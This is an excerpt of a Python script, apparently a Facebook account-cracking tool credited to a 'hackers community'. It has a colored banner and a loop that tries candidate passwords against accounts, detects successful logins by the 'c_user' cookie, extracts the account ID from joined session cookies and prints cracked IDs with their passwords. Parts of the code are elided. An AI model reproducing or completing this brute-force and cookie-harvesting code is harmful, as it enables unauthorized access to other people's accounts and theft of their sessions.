...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mMADE BY     : Awaz
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB          : Mueid Mursalin Awaz
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP    : M.M.R HACKERS COMMUNITY
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(AWAZ-CP 💔)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r %s[ AWAZ-XD ] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
